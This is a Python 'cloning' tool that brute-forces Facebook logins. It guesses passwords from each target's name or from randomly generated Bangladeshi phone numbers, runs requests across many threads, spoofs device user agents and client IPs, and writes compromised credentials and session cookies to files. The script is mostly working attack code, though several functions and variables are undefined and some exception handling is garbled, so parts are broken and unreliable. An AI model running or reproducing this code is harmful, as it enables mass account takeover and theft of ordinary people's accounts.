#──────────────{ IMPORT }──────────────#
import os,bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,requests,re
from bs4 import BeautifulSoup
from os import path
import os,base64,zlib,pip,urllib
import requests,bs4,mechanize
from os import system as clr
from bs4 import BeautifulSoup as sop
from pip._vendor import requests as requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
#──────────────{ LOOP }──────────────#
loop = 0;oks = [];cps = [];id = [];methodx = []
#──────────────{ COLOUR }──────────────#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m'
#───────────────[ COLOR SYSTEM ]─────────────────────────#
orange = "\x1b[38;5;196m";yellow = "\x1b[38;5;208m";black="\033[1;30m";red="\x1b[38;5;160m";green="\x1b[38;5;46m";yelloww="\033[1;33m";blue="\033[38;5;6m";purple="\033[1;35m";cyan="\033[1;36m";white="\033[1;37m";faltu = "\033[1;47m";pvt = "\033[1;0m";gren = "\x1b[38;5;154m";gas = "\033[1;32m"
abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
my_color = [white,blue,green];warna = random.choice(my_color)
sys.stdout.write('\x1b]2; bishesheyy\x07')
#──────────────{ LINEX }──────────────#
def clear():os.system('clear');print(logo)
def linex():print(f'\n\033[1;37m----------------------------------------------------------------')
fileu = random.randint(20000, 40000)

geerste_time = time.strftime("%H:%M:%S")
#──────────────{ LOGO }──────────────#
logo = f"""
\033[1;36m╔══════════════════════════════════════════════════════╗
║\033[1;37m                🪽  𓆩 HANCY ALI 𓆪  🪽                \033[1;36m║
╠══════════════════════════════════════════════════════╣
║ \033[1;31mWRITTEN BY  \033[1;35m : Python×ALI                           \033[1;36m║
║ \033[1;31mTOOL        \033[1;37m : FILExRANDOMxGMAIL                      \033[1;36m║
║ \033[1;31mVERSION     \033[1;35m : 1.10 ~ Paid                           \033[1;36m║
╚══════════════════════════════════════════════════════╝
\033[1;37m
Time: {geerste_time}
"""
def menu():
    clear()
    print(f"\033[91m•1\033[97m FILE CLONING")
    print(f"\033[91m[\033[97m2\033[91m]\033[97m RANDOM CLONING")    
    print(f"\033[91m[\033[97m4\033[91m]\033[97m EXIT TOOLS")
    linex()
    option = input(f'\033[91m|\033[97m?\033[91m|\033[92m CHOICE \033[97m:\033[92m ')
    if option in ['A','1']:__Filex__()
    elif option in ['B','2']:__Randmx__()
    elif option in ['C','3']:__Gmailx__()
    elif option in ['D','4']:exit()
    else:
        print(f'\n\033[91m|\033[97m!\033[91m|{orange} OPTION FOUND');menu()
#──────────────{ FILE }──────────────#
def __Filex__():
    clear()
    print(f"\033[91m•->\033[97m EXAMPLE \033[97m: \033[92m/sdcard/name.txt ");linex()
    dfile = input(f'\033[91m|\033[97m?\033[91m|\033[92m CHOICE  \033[97m:\033[92m ')
    try:
        dx = open(dfile,'r').read().splitlines()
    except FileNotFoundError:
        print(f'\033[91m|\033[97m!\033[91m|{orange} FILE NOT FOUND...');time.sleep(1);__Filex__()
    clear()
    print(f"\033[91m•->\033[97m METHOD M1 ")
    print(f"\033[91m[\033[97m2\033[91m]\033[97m METHOD M2 ")
    print(f"\033[91m[\033[97m2\033[91m]\033[97m METHOD M3 ")
    print(f"\033[91m[\033[97m4\033[91m]\033[97m METHOD M4 ")
    print(f"\033[91m[\033[97m5\033[91m]\033[97m METHOD M5 ")
    linex()
    methodx = input(f'\033[91m|\033[97m?\033[91m|\033[92m CHOICE \033[97m:\033[92m ')
    dplist = []
    try:
        clear()
        pass_lmit = int(input(f'\033[91m|\033[97m?\033[91m|\033[92m PASSWORD LIMIT \033[97m:\033[92m '))
    except:
        pass_lmit =1
    clear()
    print(f"\033[91m•->\033[97m EXAMPLE \033[97m: \033[92mfirstlast \033[97m|\033[92mfirst123\033[97m| \033[92mETC\033[97m| ");linex()
    for i in range(pass_lmit):
        dplist.append(input(f'\033[91m•->\033[97m PASS -{i+1} \033[97m:\033[92m '))
    with ThreadPool(max_workers=30) as FIREx:    
        clear();total_ids = str(len(dx))
        print(f"\033[91m•->\033[97m METHOD \033[97m:\033[92m graphql ")
        print(f"\033[91m•->\033[97m FILE UID :{G} {fileu} ")
        print(f"\033[91m•->\033[97m USE AIRPLANE MODE EVERY 5 MINTS ");linex()
        for user in dx:
            ids,names = user.split('|')
            passlist = dplist
            if methodx in ['1']:FIREx.submit(__file_M1__,ids,names,passlist)
            if methodx in ['2']:FIREx.submit(__file_M2__,ids,names,passlist)
            if methodx in ['3']:FIREx.submit(__file_M3__,ids,names,passlist)
            if methodx in ['4']:FIREx.submit(__file_M4__,ids,names,passlist)
            if methodx in ['5']:FIREx.submit(__file_M5__,ids,names,passlist)
    print('');linex()
    print(f"\033[91m•->\033[97m CLONING COMPLETE ")
    print(f"\033[91m•->\033[97m TOTAL OK ID \033[97m:\033[92m {len(oks)}")
    print(f"\033[91m•->\033[97m TOTAL CP ID \033[97m:\033[91m {len(cps)}")
    linex();exit()    
#──────────────{ FILE-METHOD-M1 }──────────────#
#──────────────{ FILE-METHOD-M1 GRAPHQL }──────────────#
def __file_M1__(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[91m|\033[92m RUNNING-M1\033[91m| \033[92m %s \033[97m| \033[92m%s \033[97m| \033[91m%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn

        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            
            headers = {
                "authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "x-fb-sim-hni": str(random.randint(40000,41000)),
                "x-fb-net-hni": str(random.randint(40000,41000)),
                "content-type": "application/x-www-form-urlencoded",
                "x-graphql-client-library": "graphservice",
                "x-fb-friendly-name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request",
                "x-tigon-is-retry": "False",
                "x-fb-privacy-context": "3643298472347298",
                "x-graphql-request-purpose": "fetch",
                "x-fb-device-group": str(random.randint(1100,1200)),
                "user-agent": "[FBAN/FB4A;FBAV/77.0.0.20.66;FBBV/30034644;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/Etisalat NG;FBMF/TECNO;FBBD/TECNO;FBPN/com.facebook.katana;FBDV/TECNO-W3;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
                "x-fb-connection-type": "WIFI",
                "x-fb-request-analytics-tags": '{"network_tags":{"product":"350685531728","purpose":"fetch","request_category":"graphql","retry_attempt":"0"},"application_tags":"graphservice"}',
                "accept-encoding": "gzip, deflate",
                "x-fb-http-engine": "Tigon/Liger",
                "x-fb-client-ip": "True",
                "x-fb-server-cluster": "True"
            }

            variables = {
                "params": {
                    "params": f'{{"server_params": {{"credential_type": "password", "password": "#PWD_FB4A:0:1756984781:{pas}", "try_num": "1", "family_device_id": "{str(uuid.uuid4())}", "device_id": "{str(uuid.uuid4())}", "server_login_source": "login", "waterfall_id": "{str(uuid.uuid4())}", "event_flow": "login_manual", "machine_id": "", "event_step": "home_page", "from_native_screen": true, "contact_point": "{ids}"}}}}',
                    "bloks_versioning_id": "faf9a745aefbd2657a9684c21ddee92d99704a03dbf7908069fd31fcce5d63b7",
                    "app_id": "com.bloks.www.bloks.caa.login.async.send_login_request"
                },
                "scale": "1.5",
                "nt_context": {
                    "using_white_navbar": True,
                    "styles_id": "d3a3f301e627d86447a99162bf8df336",
                    "pixel_ratio": 1.5,
                    "is_push_on": True,
                    "is_flipper_enabled": False,
                    "theme_params": [{"value": ["three_c"], "design_system_name": "XMDS"}],
                    "bloks_version": "faf9a745aefbd2657a9684c21ddee92d99704a03dbf7908068fd63b7"
                }
            }

            response = requests.post("https://b-graph.facebook.com/graphql", headers=headers, data={"variables": json.dumps(variables)})
            po = response.json()

            if "error" not in po:
                print(f'\r\r\x1b[38;5;46m|baba-OK| {ids} | {pas}')
                open('/sdcard/Ali/FILE/M1-OK.txt','a').write(ids+'|'+pas+'\n')
                oks.append(ids)
                break
            elif "www.facebook.com" in str(po):
                print(f'\r\r{R}|baba-CP| {ids} | {pas}')
                open('/sdcard/Ali/FILE/CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break

        loop += 1

    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass

#──────────────{ FILE-METHOD-M2 }──────────────#
import random, uuid

# ---------- Helper Functions ---------- #

def random_build_id():
    letters = "QWERTYUIOPASDFGHJKLZXCVBNM"
    return (
        random.choice(letters)
        + random.choice(letters)
        + random.choice(letters)
        + str(random.randint(100,999))
    )

def random_screen():
    screens = [
        ("720", "1600", "2.0"),
        ("720", "1520", "2.0"),
        ("1080", "1920", "3.0"),
        ("1080", "2340", "3.0"),
        ("1080", "2400", "3.5"),
        ("1440", "3120", "4.0"),
    ]
    return random.choice(screens)

def random_locale():
    locales = [
        "en_US","en_GB","id_ID","hi_IN","bn_BD",
        "ne_NP","ur_PK","ar_SA","es_ES"
    ]
    return random.choice(locales)


# ---------- Main UA Generator ---------- #

def generate_real_ua():

    manufacturers = {
        "Samsung": ["SM-G990B","SM-G970U","SM-A146B","SM-A336M","SM-M336B","SM-S911B"],
        "Xiaomi": ["Redmi Note 11","Redmi 12","Poco X3 Pro","Mi 11 Lite","Redmi 9A","Poco F3"],
        "Vivo": ["Vivo Y21","Vivo Y20","Vivo V25","Vivo V27"],
        "Oppo": ["Oppo F19","Oppo A57","Oppo A17","Oppo Reno 8"],
        "Google": ["Pixel 6","Pixel 6a","Pixel 7","Pixel 8"],
        "Infinix": ["Infinix HOT 12","Infinix HOT 30","Infinix HOT 40","Infinix Note 30"],
    }

    manufacturer = random.choice(list(manufacturers.keys()))
    device = random.choice(manufacturers[manufacturer])
    android = random.choice(["10","11","12","13","14"])
    build_id = random_build_id()

    width, height, density = random_screen()

    fb_major = random.randint(380, 600)
    fbav = f"{fb_major}.0.0.{random.randint(20,200)}.{random.randint(80,180)}"
    fbbv = random.randint(1000000, 9999999)

    locale = random_locale()

    session_id = str(uuid.uuid4())[:8]
    device_id = str(uuid.uuid4())[:8]

    # ---------- Final UA (Realistic Facebook Android) ---------- #
    ua = (
        f"Dalvik/2.1.0 (Linux; U; Android {android}; {device} Build/{build_id}) "
        f"FBAN/FB4A;"
        f"FBAV/{fbav};"
        f"FBBV/{fbbv};"
        f"FBDM/density={density};width={width};height={height};"
        f"FBLC/{locale};"
        f"FBRV/{random.randint(100000000,999999999)};"
        f"FBMF/{manufacturer};"
        f"FBBD/{manufacturer};"
        f"FBPN/com.facebook.katana;"
        f"FBDV/{device};"
        f"FBSV/{android};"
        f"FBOP/1;"
        f"FBCA/arm64-v8a;"
        f"DEVICEID/{device_id};"
        f"SESSIONID/{session_id}"
    )

    return ua


# ---------- Test Output ---------- #
for _ in range(3):
    print(generate_real_ua())
    
# Main method
def __file_M2__(ids, names, passlist):
    global loop, oks, cps        
    try:
        loop += 1  # Increment loop per UID attempt
        sys.stdout.write(f'\r\r\033[91m|\033[92mbishesheyy-m1\033[91m| \033[92m%s \033[97m| \033[92m%s \033[97m| \033[91m%s ' % (loop, len(oks), len(cps)))
        sys.stdout.flush()

        ua_agent = generate_real_ua()  # Dynamic UA

        fn = names.split(' ')[0]
        ln = names.split(' ')[1] if len(names.split(' ')) > 1 else fn

        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())

            head = {
                'User-Agent': ua_agent,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-FB-Client-IP': random_ip(),
                'X-Forwarded-For': random_ip(),
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Server-Cluster': 'True',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'x-fb-session-id': str(uuid.uuid4()),
                'x-fb-connection-token': str(uuid.uuid4()),
                'x-fb-device-group': '5120',
            }

            data = {
                "adid": str(uuid.uuid4()),
                "format": "json",
                "device_id": str(uuid.uuid4()),
                "cpl": "true",
                "family_device_id": str(uuid.uuid4()),
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": ids,
                "password": pas,
                "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "",
                "advertiser_id": str(uuid.uuid4()),
                "currently_logged_in_userid": "0",
                "locale": "en_US",
                "client_country_code": "US",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"
            }

            try:
                po = requests.post('https://api.facebook.com/auth/login', data=data, headers=head).json()
            except:
                continue  # Skip to next password if request fails

            # Success
            if "session_key" in po:
                session = po.get('session_cookies', [])
                cookie = ''.join([f"{c['name']}={c['value']};" for c in session])
                print(f'\r\r\033[92m|baba| {ids} | {pas}')
                print(f'\r\r\033[92m|COKI-OK| {cookie}\n')
                with open('/sdcard/M12-OK.txt', 'a') as f:
                    f.write(f'{ids}|{pas}|{cookie}\n')
                oks.append(ids)
                break

            # Check CP
            error_msg = po.get('error', {}).get('message', '')
            if 'www.facebook.com' in error_msg:
                print(f'\r\r{R}|baba-CP| {ids} | {pas}')
                with open('/sdcard/Cps-mq.txt', 'a') as f:
                    f.write(f'{ids}|{pas}\n')
                cps.append(ids)
                break

    except requests.requests.requests.requests.requests.requests.requests.requests.requests.exceptions.ConnectionError:
        time.sleep(5)
    except Exception:
        pass

#──────────────{ FILE-METHOD-M3 }──────────────#
def __file_M3__(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[91m|\033[92m RUNNING-M3\033[91m| \033[92m %s \033[97m| \033[92m%s \033[97m| \033[91m%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            head = {"User-Agent": ua1(),"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":"5120","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
            data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
            po = requests.post('https://b-api.facebook.com/method/auth.login',data=data,headers=head).json()
            if "session_key" in po:
                token = po['access_token']
                session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
                print(f'\r\r\x1b[38;5;46m|Ali| '+ids+' | '+pas)
                print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
                open('/sdcard/Ali/FILE/M3-OK.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}|bishesheyy-CP| '+ids+f' | '+pas)
                open('/sdcard/Ali/FILE/CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
        loop+=1
    except requests.requests.requests.requests.requests.requests.requests.requests.requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
#──────────────{ FILE-METHOD-M4 }──────────────#
def __file_M4__(ids,names,passlist):
    try:
        global loop,oks,cps
        pro= random.choice(ugen)
        agent = f"FBAN/Orca-Android;FBAV/{random.randrange(11, 99)}.0.0.{random.randrange(1111, 9999)};FBBV/{random.randrange(1111111, 9999999)};FBAN/FB4A;FBAV/74.0.0.4636;FBBV/3230308;FBAN/FB4A;FBAV/437.0.0.35.116;FBBV/527644733;FBDM/density=3.0;width=2020;height=1080;FBLC/en_US;FBRV/529308758;FB_FW/2;FBCR/Searching for Service;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G970U;FBSV/12;FBOP/1;FBCA/arm64-v8a;"
        sys.stdout.write(f'\r\r\033[91m|\033[92m RUNNING-M4\033[91m| \033[92m %s \033[97m| \033[92m%s \033[97m| \033[91m%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            head = {"User-Agent": agent,"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":"5120","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
            data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
            po = requests.post('https://graph.facebook.com/auth/login',data=data,headers=head).json()
            if "session_key" in po:
                token = po['access_token']
                session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
                print(f'\r\r\x1b[38;5;46m|baba| '+ids+' | '+pas)
                print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
                open('/sdcard/Ali/FILE/M4-OK.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}|baba-CP| '+ids+f' | '+pas)
                open('/sdcard/Ali/FILE/CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
        loop+=1
    except requests.requests.requests.requests.requests.requests.requests.requests.requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
#──────────────{ FILE-METHOD-M5 }──────────────#
def __file_M5__(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r\033[91m|\033[92m RUNNING-M5\033[91m| \033[92m %s \033[97m| \033[92m%s \033[97m| \033[91m%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
    session = requests.Session()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Ahmed'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
            ua = '[FBAN/FB4A;FBAV/' + str(random.randint(49, 66)) + '.0.0.' + str(random.randrange(20, 49)) + str(random.randint(11, 99)) + ';FBBV/' + str(random.randint(11111111, 77777777)) + ';Davik/2.1.0 (Linux; U; Android 12; Redmi Note 10S Build/TP1A.220905.001) [FBAN/FB4A;FBAV/37.0.0.13287;FBBV/77196546;[FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672900;FBDM/{density=3.0,width=1080,height=1920};FBLC/ru_RU;FBRV/0;FBCR/YOTA;FBMF/LENOVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo Z90a40;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]' + 'Davik/2.1.0 (Linux; U; Android 8; Redmi Note 10S Build/SKQ1.210216.001) [FBAN/FB4A;FBAV/24.0.0.33286;FBBV/51920175;[FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672900;FBDM/{density=3.0,width=1080,height=1920};FBLC/ru_RU;FBRV/0;FBCR/YOTA;FBMF/LENOVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo Z90a40;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
            ua = '[FBAN/FB4A;FBAV/' + str(random.randint(49, 66)) + '.0.0.' + str(random.randrange(20, 49)) + str(random.randint(11, 99)) + ';FBBV/' + str(random.randint(11111111, 77777777)) + ';Dalvik/1.6.0(Linux; U; Android 11.0;Moto G Fast Build/JG46BFQK)[FBAN/FB4A;FBAV/93.0.0.65.75FBBV/7930657FBDM/{density=3.0,width=685,height=864}FBLC/it_ITFBRV/6768659FBCR/Boost MobileFBMF/MotorolaFBBD/MotorolaFBPN/com.facebook.katanaFBDV/Moto G FastFBSV/11.0FBOP/1FBCA/x86:armeabi-v7a]' + 'Dalvik/2.1.0(Linux; U; Android 11.0;LM-X410 Build/G5ZCAODO)[FBAN/FB4A;FBAV/109.0.0.20.96FBBV/9081406FBDM/{density=3.0,width=442,height=1597}FBLC/fr_FRFBRV/8786878FBCR/OrangeFBMF/LGFBBD/LGFBPN/com.facebook.katanaFBDV/LM-X410FBSV/11.0FBOP/1FBCA/x86:armeabi-v7a]' + 'Dalvik/1.8.0(Linux; U; Android 6.0;P30 Pro Build/88LZSG3S)[FBAN/FB4A;FBAV/86.0.0.97.90FBBV/3552456FBDM/{density=3.0,width=965,height=1402}FBLC/pt_BRFBRV/7286143FBCR/VodafoneFBMF/HuaweiFBBD/HuaweiFBPN/com.facebook.katanaFBDV/P30 ProFBSV/6.0FBOP/1FBCA/x86:armeabi-v7a]' + 'Dalvik/1.8.0(Linux; U; Android 8.0;Xperia 1 II Build/JWMB4FUQ)[FBAN/FB4A;FBAV/109.0.0.68.90FBBV/7235514FBDM/{density=3.0,width=905,height=1700}FBLC/zh_TWFBRV/837160FBCR/SprintFBMF/SonyFBBD/SonyFBPN/com.facebook.katanaFBDV/Xperia 1 IIFBSV/8.0FBOP/1FBCA/x86:armeabi-v7a]'
            head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
            getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
            idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
            complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
            FIRExd=session.cookies.get_dict().keys()
            if "c_user" in FIRExd:
                coki=session.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                print(f'\r\r\x1b[38;5;46m|baba| '+ids+' | '+pas)
                print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
                open('/sdcard/Ali/FILE/M5-OK.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'checkpoint' in bishesheyyxd:
                print(f'\r\r{R}|baba-CP| '+ids+' | '+pas)
                open('/sdcard/Ali/FILE/CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
    except requests.requests.requests.requests.requests.requests.requests.requests.requests.exceptions.ConnectionError:
        time.sleep(20)
    loop+=1
#──────────────{ RANDOM }──────────────#
def __Randmx__():
    clear()
    print(f"\033[91m1\033[97m BANGLADESH CLONING")
    print(f"\033[91m[\033[97m2\033[91m]\033[97m INDIA CLONING")
    print(f"\033[91m[\033[97m2\033[91m]\033[97m NEPAL CLONING")
    print(f"\033[91m[\033[97m4\033[91m]\033[97m PAKISTAN CLONING")
    print(f"\033[91m[\033[97m5\033[91m]\033[97m AFGHANISTAN CLONING");linex()
    option = input(f'\033[91m|\033[97m?\033[91m|\033[92m CHOICE \033[97m:\033[92m ')
    if option in ['A','1']:__bdx__()
    elif option in ['B','2']:__india__()
    elif option in ['C','3']:__nepalx__()
    elif option in ['D','4']:__pakistan__()
    elif option in ['E','5']:__afghanistanx__()
    else:
        print(f'\n\033[91m|\033[97m!\033[91m|{orange} OPTION FOUND');menu()
#──────────────{ RANDOM-BD }──────────────#
def __bdx__():
    user=[]
    clear()
    print(f'\033[91m•->\033[97m EXAMPLE \033[97m: \033[92m017 \033[97m/ \033[92m019 \033[97m/ \033[92m016 \033[97m/ \033[92m018');linex()
    code=input(f'\033[91m|\033[97m?\033[91m|\033[92m CHOICE  \033[97m:\033[92m ')
    clear()
    print(f'\033[91m•->\033[97m EXAMPLE \033[97m: \033[92m5000 \033[97m/ \033[92m10000 \033[97m/ \033[92m9999 ');linex()
    try:
        limit=int(input(f'\033[91m|\033[97m?\033[91m|\033[92m CHOICE  \033[97m:\033[92m '))
    except ValueError:
        limit=50000
    clear()
    print(f"\033[91m•->\033[97m METHOD M1 ")
    print(f"\033[91m[\033[97m2\033[91m]\033[97m METHOD M2 ");linex()
    methodx = input(f'\033[91m|\033[97m?\033[91m|\033[92m CHOICE \033[97m:\033[92m ')
    for nmbr in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=38) as FIREx:
        clear()
        tl=str(len(user))
        print(f"\033[91m•->\033[97m METHOD    \033[97m:\033[92m M{methodx} ")
        print(f'\033[91m•->\033[97m SIM CODE  \033[97m:\033[92m {code} ')
        print(f'\033[91m•->\033[97m TOTAL UID \033[97m:\033[92m {tl} ')
        print(f"\033[91m•->\033[97m USE AIRPLANE MODE EVERY 5 MINTS ");linex()
        for love in user:
            ids=code+love
            passlist=[love,ids,ids[:7],ids[:6],ids[5:],ids[4:],'sadiya','jannat','freefire','Bangladesh','@@@###','aabbcc','aaabbb']
            if methodx in ['1']:FIREx.submit(__Randm_M1__,ids,passlist)
            if methodx in ['2']:FIREx.submit(__Randm_M2__,ids,passlist)
    print('');linex()
    print(f"\033[91m•->\033[97m CLONING COMPLETE ")
